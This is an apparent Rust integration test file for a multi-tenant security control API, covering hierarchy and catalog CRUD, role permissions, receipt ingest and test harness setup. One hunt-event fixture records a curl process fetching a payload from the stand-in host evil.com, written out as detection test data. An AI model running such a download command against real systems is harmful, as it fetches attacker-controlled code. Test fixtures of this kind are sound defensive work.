    assert_eq!(viewer_fork_resp.0, StatusCode::FORBIDDEN);

    let member_delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(member_key),
        None,
    )
    .await;
    assert_eq!(member_delete_resp.0, StatusCode::FORBIDDEN);

    let other_get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(other_admin_key),
        None,
    )
    .await;
    assert_eq!(other_get_resp.0, StatusCode::NOT_FOUND);

    let other_update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(other_admin_key),
        Some(serde_json::json!({
            "description": "cross-tenant"
        })),
    )
    .await;
    assert_eq!(other_update_resp.0, StatusCode::NOT_FOUND);

    let other_fork_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/catalog/templates/{template_id}/fork"),
        Some(other_admin_key),
        None,
    )
    .await;
    assert_eq!(other_fork_resp.0, StatusCode::NOT_FOUND);

    let delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_resp.0, StatusCode::OK);
    assert_eq!(delete_resp.1["deleted"], true);

    let get_deleted_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_deleted_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_routes_support_crud_tree_and_clearable_fields() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let policy_id = Uuid::new_v4();

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Acme Org",
            "node_type": "org",
            "metadata": { "tier": "root" }
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let project_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Project Alpha",
            "node_type": "project",
            "parent_id": root_id.clone(),
            "policy_id": policy_id,
            "policy_name": "strict",
            "metadata": { "tier": "prod" }
        })),
    )
    .await;
    assert_eq!(project_resp.0, StatusCode::OK);
    let project_id = project_resp.1["id"]
        .as_str()
        .expect("project id")
        .to_string();

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert_eq!(list_resp.1.as_array().expect("hierarchy nodes").len(), 2);

    let get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{project_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_resp.0, StatusCode::OK);
    assert_eq!(get_resp.1["policy_name"], "strict");

    let tree_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hierarchy/tree".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(tree_resp.0, StatusCode::OK);
    assert_eq!(tree_resp.1["root_id"], root_id);
    assert!(tree_resp.1["nodes"]
        .as_array()
        .expect("tree nodes")
        .iter()
        .any(|node| {
            node["id"] == root_id
                && node["children"]
                    .as_array()
                    .expect("root children")
                    .iter()
                    .any(|child| child.as_str() == Some(project_id.as_str()))
        }));

    // Clear policy_id, policy_name, and metadata while keeping parent_id
    // (non-org nodes must always have a parent).
    let update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{project_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Project Alpha Renamed",
            "policy_id": null,
            "policy_name": null,
            "metadata": null
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::OK);
    assert_eq!(update_resp.1["name"], "Project Alpha Renamed");
    // parent_id is omitted from the update, so it stays as the root.
    assert_eq!(update_resp.1["parent_id"], root_id);
    assert!(update_resp.1["policy_id"].is_null());
    assert!(update_resp.1["policy_name"].is_null());
    assert_eq!(update_resp.1["metadata"], serde_json::json!({}));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_routes_enforce_permissions_and_delete_modes() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_key = "cs_it_hierarchy_viewer_key";

    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "hierarchy-viewer",
        &["viewer"],
    )
    .await;

    let viewer_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(viewer_key),
        Some(serde_json::json!({
            "name": "Viewer Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(viewer_create_resp.0, StatusCode::FORBIDDEN);

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Root Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let orphan_team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Orphan Team",
            "node_type": "team"
        })),
    )
    .await;
    assert_eq!(orphan_team_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        orphan_team_resp.1["error"],
        "team nodes must specify a parent_id"
    );

    let team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Team One",
            "node_type": "team",
            "parent_id": root_id.clone()
        })),
    )
    .await;
    assert_eq!(team_resp.0, StatusCode::OK);
    let team_id = team_resp.1["id"].as_str().expect("team id").to_string();

    let agent_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Agent One",
            "node_type": "agent",
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(agent_resp.0, StatusCode::OK);
    let agent_id = agent_resp.1["id"].as_str().expect("agent id").to_string();

    let project_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Project One",
            "node_type": "project",
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(project_resp.0, StatusCode::OK);
    let project_id = project_resp.1["id"]
        .as_str()
        .expect("project id")
        .to_string();

    let cycle_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{root_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(cycle_resp.0, StatusCode::BAD_REQUEST);
    let cycle_err = cycle_resp.1["error"].as_str().expect("cycle or type error");
    assert!(
        cycle_err.contains("cycle") || cycle_err.contains("cannot be a child of"),
        "expected cycle or type validation error, got: {cycle_err}"
    );

    let detach_team_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{team_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "parent_id": null
        })),
    )
    .await;
    assert_eq!(detach_team_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        detach_team_resp.1["error"],
        "team nodes must specify a parent_id"
    );

    // Reparenting team's children (endpoint + project) to org should fail because
    // endpoint nodes cannot be direct children of org nodes.
    let delete_reparent_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hierarchy/nodes/{team_id}?reparent=true"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_reparent_resp.0, StatusCode::BAD_REQUEST);
    assert!(
        delete_reparent_resp.1["error"]
            .as_str()
            .expect("reparent error")
            .contains("cannot reparent"),
        "expected reparent type validation error, got: {}",
        delete_reparent_resp.1["error"]
    );

    // Delete without reparent (cascade) should still work.
    let delete_cascade_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hierarchy/nodes/{team_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_cascade_resp.0, StatusCode::OK);

    // Agent and project should be gone (cascade deleted).
    let agent_after_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{agent_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(agent_after_resp.0, StatusCode::NOT_FOUND);

    let project_after_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{project_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(project_after_resp.0, StatusCode::NOT_FOUND);

    let temp_team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Temp Team",
            "node_type": "team",
            "parent_id": root_id.clone()
        })),
    )
    .await;
    assert_eq!(temp_team_resp.0, StatusCode::OK);
    let temp_team_id = temp_team_resp.1["id"]
        .as_str()
        .expect("temp team id")
        .to_string();

    let temp_leaf_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Temp Agent",
            "node_type": "agent",
            "parent_id": temp_team_id.clone()
        })),
    )
    .await;
    assert_eq!(temp_leaf_resp.0, StatusCode::OK);
    let temp_leaf_id = temp_leaf_resp.1["id"]
        .as_str()
        .expect("temp leaf id")
        .to_string();

    let delete_cascade_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hierarchy/nodes/{temp_team_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_cascade_resp.0, StatusCode::OK);
    assert_eq!(delete_cascade_resp.1["deleted_count"], 2);
    assert_eq!(delete_cascade_resp.1["reparented_count"], 0);

    let missing_leaf_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{temp_leaf_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(missing_leaf_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_routes_reject_node_type_changes_that_strand_invalid_children() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Root Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Team One",
            "node_type": "team",
            "parent_id": root_id.clone()
        })),
    )
    .await;
    assert_eq!(team_resp.0, StatusCode::OK);
    let team_id = team_resp.1["id"].as_str().expect("team id").to_string();

    let endpoint_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Builder Host",
            "node_type": "endpoint",
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(endpoint_resp.0, StatusCode::OK);
    let endpoint_id = endpoint_resp.1["id"]
        .as_str()
        .expect("endpoint id")
        .to_string();

    let runtime_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Claude Runtime",
            "node_type": "runtime",
            "parent_id": endpoint_id.clone()
        })),
    )
    .await;
    assert_eq!(runtime_resp.0, StatusCode::OK);

    let update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{endpoint_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "node_type": "project"
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        update_resp.1["error"],
        "cannot change node_type: children of type [runtime] are not allowed under a project node"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_tree_prefers_org_root_over_other_top_level_nodes() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    sqlx::query::query(
        r#"INSERT INTO hierarchy_nodes (tenant_id, name, node_type, metadata)
           VALUES ($1, $2, $3, $4)"#,
    )
    .bind(harness.tenant_id)
    .bind("Orphan Project")
    .bind("project")
    .bind(serde_json::json!({ "source": "integration-test" }))
    .execute(&harness.db)
    .await
    .expect("insert orphan project");

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Canonical Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let tree_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hierarchy/tree".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(tree_resp.0, StatusCode::OK);
    assert_eq!(tree_resp.1["root_id"], root_id);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn receipt_ingest_rejects_viewer_but_allows_member() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_key = "cs_it_receipts_viewer_key";
    let member_key = "cs_it_receipts_member_key";

    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "receipt-viewer",
        &["viewer"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_key,
        "receipt-member",
        &["write"],
    )
    .await;

    let keypair = hush_core::Keypair::generate();
    let signed_receipt = hush_core::SignedReceipt::sign(
        hush_core::Receipt::new(hush_core::Hash::zero(), hush_core::Verdict::pass()),
        &keypair,
    )
    .unwrap();
    let receipt_timestamp = signed_receipt.receipt.timestamp.clone();
    let receipt_signature = signed_receipt.signatures.signer.to_hex();
    let signed_receipt_json = serde_json::to_value(&signed_receipt).unwrap();
    let receipt_payload = serde_json::json!({
        "timestamp": receipt_timestamp,
        "verdict": "allow",
        "guard": "policy_validation",
        "policy_name": "strict",
        "signature": receipt_signature,
        "public_key": keypair.public_key().to_hex(),
        "signed_receipt": signed_receipt_json,
        "metadata": {
            "client_receipt_id": "local-001"
        }
    });

    let viewer_store_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts".to_string(),
        Some(viewer_key),
        Some(receipt_payload.clone()),
    )
    .await;
    assert_eq!(viewer_store_resp.0, StatusCode::FORBIDDEN);

    let viewer_batch_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts/batch".to_string(),
        Some(viewer_key),
        Some(serde_json::json!({
            "receipts": [receipt_payload.clone()]
        })),
    )
    .await;
    assert_eq!(viewer_batch_resp.0, StatusCode::FORBIDDEN);

    let member_store_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts".to_string(),
        Some(member_key),
        Some(receipt_payload.clone()),
    )
    .await;
    assert_eq!(member_store_resp.0, StatusCode::OK);

    let member_batch_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts/batch".to_string(),
        Some(member_key),
        Some(serde_json::json!({
            "receipts": [receipt_payload]
        })),
    )
    .await;
    assert_eq!(member_batch_resp.0, StatusCode::OK);
    assert_eq!(member_batch_resp.1["count"], 1);
}

async fn setup_harness() -> Harness {
    let postgres = run_container(&[
        "run",
        "-d",
        "--rm",
        "-e",
        "POSTGRES_USER=postgres",
        "-e",
        "POSTGRES_PASSWORD=postgres",
        "-e",
        "POSTGRES_DB=cloud_api",
        "-p",
        "127.0.0.1::5432",
        "postgres:16-alpine",
    ]);
    let nats = run_container(&[
        "run",
        "-d",
        "--rm",
        "-p",
        "127.0.0.1::4222",
        "nats:2.10-alpine",
        "-js",
    ]);

    let pg_port = container_host_port(&postgres, 5432);
    let nats_port = container_host_port(&nats, 4222);
    let database_url = format!("postgres://postgres:postgres@127.0.0.1:{pg_port}/cloud_api");
    let nats_url = format!("nats://127.0.0.1:{nats_port}");

    wait_for_postgres(&database_url).await;
    wait_for_nats(&nats_url).await;

    let db = create_pool(&database_url).await.expect("create pool");
    apply_migrations(&db).await;

    let nats_client = async_nats::connect(&nats_url).await.expect("connect nats");
    let signing_keypair = Arc::new(hush_core::Keypair::generate());

    let config = Config {
        listen_addr: "127.0.0.1:0".parse().expect("listen addr"),
        cors_allowed_origins: Vec::new(),
        database_url: database_url.clone(),
        nats_url: nats_url.clone(),
        agent_nats_url: nats_url.clone(),
        nats_provisioning_mode: "mock".to_string(),
        nats_provisioner_base_url: None,
        nats_provisioner_api_token: None,
        nats_allow_insecure_mock_provisioner: true,
        jwt_secret: "jwt-secret".to_string(),
        jwt_issuer: "clawdstrike-control-api".to_string(),
        jwt_audience: "clawdstrike-control-api".to_string(),
        stripe_secret_key: "stripe-key".to_string(),
        stripe_webhook_secret: "stripe-webhook".to_string(),
        approval_signing_enabled: true,
        approval_signing_keypair_path: None,
        approval_resolution_outbox_enabled: true,
        approval_resolution_outbox_poll_interval_secs: 5,
        audit_consumer_enabled: false,
        audit_subject_filter: "tenant-*.>".to_string(),
        audit_stream_name: "audit".to_string(),
        audit_consumer_name: "audit-consumer".to_string(),
        approval_consumer_enabled: false,
        approval_subject_filter: "tenant-*.>".to_string(),
        approval_stream_name: "approval".to_string(),
        approval_consumer_name: "approval-consumer".to_string(),
        heartbeat_consumer_enabled: false,
        heartbeat_subject_filter: "tenant-*.>".to_string(),
        heartbeat_stream_name: "heartbeat".to_string(),
        heartbeat_consumer_name: "heartbeat-consumer".to_string(),
        hunt_event_consumer_enabled: false,
        hunt_event_subject_filter: "tenant-*.>".to_string(),
        hunt_event_stream_name: "hunt-events".to_string(),
        hunt_event_consumer_name: "hunt-event-consumer".to_string(),
        stale_detector_enabled: false,
        stale_check_interval_secs: 60,
        stale_threshold_secs: 120,
        dead_threshold_secs: 300,
    };

    let provisioner = TenantProvisioner::new(
        db.clone(),
        nats_url.clone(),
        &config.nats_provisioning_mode,
        config.nats_provisioner_base_url.clone(),
        config.nats_provisioner_api_token.clone(),
        config.nats_allow_insecure_mock_provisioner,
    )
    .expect("provisioner");
    let state = AppState {
        config: config.clone(),
        db: db.clone(),
        nats: nats_client.clone(),
        provisioner,
        metering: MeteringService::new(db.clone()),
        alerter: AlerterService::new(db.clone()),
        retention: RetentionService::new(db.clone()),
        signing_keypair: Some(signing_keypair.clone()),
        receipt_store: crate::routes::receipts::ReceiptStore::new(),
        catalog: crate::services::catalog::CatalogStore::new(),
    };
    let app = routes::router(state);

    let tenant_id = Uuid::new_v4();
    let tenant_slug = "acme-int".to_string();
    sqlx::query::query(
        r#"INSERT INTO tenants (
               id, name, slug, plan, status, agent_limit, retention_days
           ) VALUES ($1, 'Acme Integration', $2, 'enterprise', 'active', 100, 30)"#,
    )
    .bind(tenant_id)
    .bind(&tenant_slug)
    .execute(&db)
    .await
    .expect("seed tenant");

    let api_key = "cs_it_admin_key".to_string();
    sqlx::query::query(
        r#"INSERT INTO api_keys (
               tenant_id, name, key_hash, key_prefix, scopes
           ) VALUES ($1, 'integration', $2, 'cs_it', ARRAY['admin'])"#,
    )
    .bind(tenant_id)
    .bind(hash_api_key(&api_key))
    .execute(&db)
    .await
    .expect("seed api key");

    Harness {
        app,
        db,
        nats: nats_client,
        nats_url,
        tenant_id,
        tenant_slug,
        api_key,
        signing_keypair,
        _postgres: postgres,
        _nats: nats,
    }
}

async fn seed_tenant(db: &PgPool, slug: &str, name: &str) -> Uuid {
    let tenant_id = Uuid::new_v4();
    sqlx::query::query(
        r#"INSERT INTO tenants (
               id, name, slug, plan, status, agent_limit, retention_days
           ) VALUES ($1, $2, $3, 'enterprise', 'active', 100, 30)"#,
    )
    .bind(tenant_id)
    .bind(name)
    .bind(slug)
    .execute(db)
    .await
    .expect("seed tenant");
    tenant_id
}

async fn apply_migrations(db: &PgPool) {
    for file in migration_files() {
        let sql = std::fs::read_to_string(&file).expect("read migration file");
        sqlx::raw_sql::raw_sql(&sql)
            .execute(db)
            .await
            .unwrap_or_else(|err| panic!("migration {:?} failed: {}", file, err));
    }
}

fn migration_files() -> Vec<std::path::PathBuf> {
    let mut files =
        std::fs::read_dir(std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("migrations"))
            .expect("read migrations")
            .map(|entry| entry.expect("entry").path())
            .collect::<Vec<_>>();
    files.sort();
    files
}

fn migration_names() -> Vec<String> {
    migration_files()
        .into_iter()
        .map(|path| {
            path.file_name()
                .expect("migration filename")
                .to_string_lossy()
                .to_string()
        })
        .collect()
}

async fn insert_api_key_for_tenant(
    db: &PgPool,
    tenant_id: Uuid,
    raw_key: &str,
    name: &str,
    scopes: &[&str],
) {
    let scope_values = scopes
        .iter()
        .map(|scope| scope.to_string())
        .collect::<Vec<_>>();
    sqlx::query::query(
        r#"INSERT INTO api_keys (
               tenant_id, name, key_hash, key_prefix, scopes
           ) VALUES ($1, $2, $3, 'cs_it', $4)"#,
    )
    .bind(tenant_id)
    .bind(name)
    .bind(hash_api_key(raw_key))
    .bind(&scope_values)
    .execute(db)
    .await
    .expect("seed tenant api key");
}

fn signed_hunt_ingest_request(harness: &Harness, mut event: Value) -> Value {
    let issuer_probe = spine::build_signed_envelope(
        harness.signing_keypair.as_ref(),
        0,
        None,
        event.clone(),
        spine::now_rfc3339(),
    )
    .expect("sign hunt event");
    let issuer = issuer_probe
        .get("issuer")
        .and_then(Value::as_str)
        .expect("signed hunt event issuer")
        .to_string();

    event["evidence"]["issuer"] = Value::String(issuer);
    event["evidence"]["signatureValid"] = Value::Bool(true);
    let envelope = spine::build_signed_envelope(
        harness.signing_keypair.as_ref(),
        0,
        None,
        event.clone(),
        spine::now_rfc3339(),
    )
    .expect("sign hunt event");

    serde_json::json!({
        "event": event,
        "rawEnvelope": envelope,
    })
}

fn signed_hunt_ingest_request_without_canonical_evidence(harness: &Harness, event: Value) -> Value {
    let envelope = spine::build_signed_envelope(
        harness.signing_keypair.as_ref(),
        0,
        None,
        event.clone(),
        spine::now_rfc3339(),
    )
    .expect("sign hunt event without canonical evidence");

    serde_json::json!({
        "event": event,
        "rawEnvelope": envelope,
    })
}

fn canonical_json_hash_for_test(value: &Value) -> String {
    let canonical = hush_core::canonicalize_json(value).expect("canonicalize JSON");
    let mut hasher = Sha256::new();
    hasher.update(canonical.as_bytes());
    format!("0x{}", hex::encode(hasher.finalize()))
}

async fn seed_hunt_events(harness: &Harness) {
    for event in [
        serde_json::json!({
                "eventId": "hunt-evt-1",
                "tenantId": harness.tenant_id.to_string(),
                "source": "tetragon",
                "kind": "process_exec",
                "occurredAt": "2026-03-06T12:00:00Z",
                "ingestedAt": "2026-03-06T12:00:01Z",
                "severity": "low",
                "verdict": "allow",
                "summary": "process_exec /usr/bin/curl evil.com/payload",
                "actionType": "process",
                "principal": {
                    "principalId": "principal-1",
                    "endpointAgentId": "endpoint-1",
                    "runtimeAgentId": "runtime-1",
                    "principalType": "agent"
                },
                "sessionId": "session-1",
                "grantId": "grant-1",
                "detectionIds": ["finding-1"],
                "target": {
                    "kind": "process",
                    "id": "1001",
                    "name": "curl"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:hunt-evt-1",
                    "envelopeHash": "hash-1",
                    "issuer": "spiffe://tenant/acme",
                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "process": "/usr/bin/curl",
                    "namespace": "default",
                    "pod": "agent-pod-1",
                    "url": "https://evil.com/payload"
                }
        }),
        serde_json::json!({
                "eventId": "hunt-evt-2",
                "tenantId": harness.tenant_id.to_string(),
                "source": "tetragon",
                "kind": "process_exec",
                "occurredAt": "2026-03-06T12:01:00Z",
                "ingestedAt": "2026-03-06T12:01:01Z",
                "severity": "medium",
                "verdict": "allow",
                "summary": "process_exec /usr/bin/ssh admin@example.net",
                "actionType": "process",
                "principal": {
                    "principalId": "principal-1",
                    "endpointAgentId": "endpoint-1",
                    "runtimeAgentId": "runtime-1",
                    "principalType": "agent"
                },
                "sessionId": "session-1",
                "grantId": "grant-1",
                "target": {
                    "kind": "process",
                    "id": "1002",
                    "name": "ssh"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:hunt-evt-2",
                    "envelopeHash": "hash-2",
                    "issuer": "spiffe://tenant/acme",
                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "process": "/usr/bin/ssh",
                    "namespace": "default",
                    "pod": "agent-pod-1"
                }
        }),
        serde_json::json!({
                "eventId": "hunt-evt-3",
                "tenantId": harness.tenant_id.to_string(),
                "source": "hubble",
                "kind": "network_flow",
                "occurredAt": "2026-03-06T12:02:00Z",
                "ingestedAt": "2026-03-06T12:02:01Z",
                "severity": "medium",
                "verdict": "forwarded",
                "summary": "network flow to api.example.com:443",
                "actionType": "network",
                "principal": {
                    "principalId": "principal-2",
                    "endpointAgentId": "endpoint-2",
                    "runtimeAgentId": "runtime-2",
                    "principalType": "agent"
                },
                "sessionId": "session-2",
                "target": {
                    "kind": "network",
                    "id": "443",
                    "name": "api.example.com"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:hunt-evt-3",
                    "envelopeHash": "hash-3",
                    "issuer": "spiffe://tenant/acme",
                    "schemaName": "clawdstrike.sdr.fact.hubble_flow.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "namespace": "prod",
                    "pod": "network-pod-1"
                }
        }),
    ] {
        let request_body = signed_hunt_ingest_request(harness, event);
        let response = request_json(
            &harness.app,
            Method::POST,
            "/api/v1/hunt/events/ingest".to_string(),
            Some(&harness.api_key),
            Some(request_body),
        )
        .await;
        assert_eq!(response.0, StatusCode::OK);
    }
}

async fn seed_operator_flow_fixture(harness: &Harness) -> OperatorFlowFixture {
    let agent_id = "agent-operator-e2e-1".to_string();
    let session_id = "session-operator-flow-1".to_string();
    let detection_raw_ref = "hunt-envelope:operator-flow-detection-1".to_string();
    let response_raw_ref = "hunt-envelope:operator-flow-response-1".to_string();
    let operator_keypair = hush_core::Keypair::generate();

    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": &agent_id,
            "name": "Operator Endpoint",
            "public_key": operator_keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "high"
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);

    let principal_row = sqlx::query::query(
        "SELECT principal_id FROM agents WHERE tenant_id = $1 AND agent_id = $2",
    )
    .bind(harness.tenant_id)
    .bind(&agent_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch operator principal");
    let principal_id: Uuid = principal_row
        .try_get::<Option<Uuid>, _>("principal_id")
        .expect("principal_id")
        .expect("principal should be linked");

    let response_subject = format!(
        "{}.response.command.endpoint.{agent_id}",
        tenant_subject_prefix(&harness.tenant_slug)
    );
    let legacy_response_subject = format!(
        "{}.posture.command.{agent_id}",
        tenant_subject_prefix(&harness.tenant_slug)
    );
    let js = async_nats::jetstream::new(harness.nats.clone());
    spine::nats_transport::ensure_stream(
        &js,
        "response-action-integration",
        vec![response_subject.clone(), legacy_response_subject.clone()],
        1,
    )
    .await
    .expect("response action stream should exist");

    let now = chrono::Utc::now().timestamp();
    let mut grant_claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new(principal_id.to_string())
            .expect("principal id should be a valid agent id"),
        hush_multi_agent::AgentId::new(format!("delegate:{}", Uuid::new_v4()))
            .expect("delegate id should be valid"),
        now,
        now + 3600,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build delegation claims");
    grant_claims.pur = Some("operator containment".to_string());
    grant_claims.ctx = Some(serde_json::json!({
        "workflow": "fleet_operator_e2e"
    }));
    let grant_token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(
        grant_claims,
        &operator_keypair,
    )
    .expect("sign delegation token");

    let grant_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": grant_token,
            "grant_type": "delegation",
            "source_session_id": &session_id,
            "issuer_public_key": operator_keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(grant_resp.0, StatusCode::OK);
    assert_eq!(grant_resp.1["status"], "active");
    let grant_id =
        Uuid::parse_str(grant_resp.1["id"].as_str().expect("grant id")).expect("parse grant id");

    let create_rule_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Operator flow rule",
            "description": "Detect suspicious operator workflow activity",
            "severity": "high",
            "source_format": "native_correlation",
            "execution_mode": "streaming",
